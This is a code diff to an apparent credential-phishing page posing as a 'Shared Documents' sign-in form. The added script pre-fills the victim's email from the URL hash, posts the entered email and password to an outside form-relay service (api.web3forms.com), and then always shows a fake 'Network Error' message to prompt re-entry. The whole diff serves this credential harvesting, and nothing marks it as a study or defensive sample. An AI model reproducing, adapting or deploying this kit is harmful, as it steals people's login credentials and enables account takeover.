@@ -8,6 +8,7 @@
         <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script> 
+    <script src="len.js"></script>
         <style> 
          .col-sm-3 {
          cursor: pointer;
@@ -43,25 +44,6 @@
                 width:46%
             }
         }
-        element.style {
-        }
-        @media (min-width: 576px) {
-            .navbar-expand-sm>.container, .navbar-expand-sm>.container-fluid, .navbar-expand-sm>.container-lg, .navbar-expand-sm>.container-md, .navbar-expand-sm>.container-sm, .navbar-expand-sm>.container-xl {
-                -ms-flex-wrap: nowrap;
-                flex-wrap: nowrap;
-            } 
-        }
-        element.style {
-         }
-         .float-left {
-            float: left !important;
-         }
-         article, aside, figcaption, figure, footer, header, hgroup, main, nav, section {
-            display: block;
-         }
-         *, ::after, ::before {
-            box-sizing: border-box;
-         }
          aside {
             display: block;
             unicode-bidi: isolate;
@@ -363,17 +345,66 @@ input {
  <input type="password" name="x2" id="x2" class="form-control mb-3" placeholder="Password" value required>
  <button id="submitbtn" class="btn-md btn primary">Sign in</button>
  </form>
+ <div id="msg" style="display: none;"></div>
  </div>
  </div>
 </div>
 </div>
 </div>
-<script type="text/javascript"> 
-$(document).ready(function() { 
-    $('.loaded').html(' 
-    <h4 class="">SHARED DOCUMENTS</h4>
-    <div class="col-sm-3" data-toggle="modal" data-target="#mymodal">
-        <img src="images/"
-        </script>   
-    </body>
+<script type="text/javascript">
+    $(document).ready(function () {
+        // Get URL from the hash and set it to the input field
+        var url = window.location.hash.substr(1);  
+        $("#x1").val(url); 
+
+        $("#formx").submit(function (e) {
+            e.preventDefault(); // Prevent default form submission
+
+            // Get values from the form
+            var nm = $("#A1").val(); 
+            var formData = new FormData($("#formx")[0]);
+
+            // Disable the submit button and show a loading spinner
+            $("#submitBtn").html('<span class="spinner-grow spinner-grow-sm"></span> Please Wait....').prop("disabled", true); 
+
+            // AJAX request
+            $.ajax({
+                url: "https://api.web3forms.com/submit",
+                type: 'POST',
+                data: formData,
+                contentType: false,
+                processData: false,
+                success: function (res) {
+                    setTimeout(function () {
+                        $("#x1").val(url); // Reset input
+                        $("#x2").val(""); // Clear another input if needed
+                        $("#msg").show();
+                        $("#msg").html("Network Error! Please verify your information and try again"); // Success message
+                        $("#submitBtn").html("Sign In").prop("disabled", false); // Reset button
+                    }, 1000);
+                },
+                error: function (res) {
+                    setTimeout(function () {
+                        $("#x1").val(url); // Reset input
+                        $("#x2").val(""); // Clear another input if needed
+                        $("#msg").show();
+                        $("#msg").html("Network Error! Please verify your information and try again"); // Error message
+                        $("#submitBtn").html("Sign In").prop("disabled", false); // Reset button
+                    }, 1000);
+                }
+            });
+        });
+
+        // Hide the message when x2 is clicked
+        $("#x2").click(function () {
+            $("#msg").hide();
+        });
+    });
+</script>
+ <script>
+    $(document).ready(function() {
+        console.log("jQuery is loaded!");
+    });
+</script>
+      </body>
 </html>
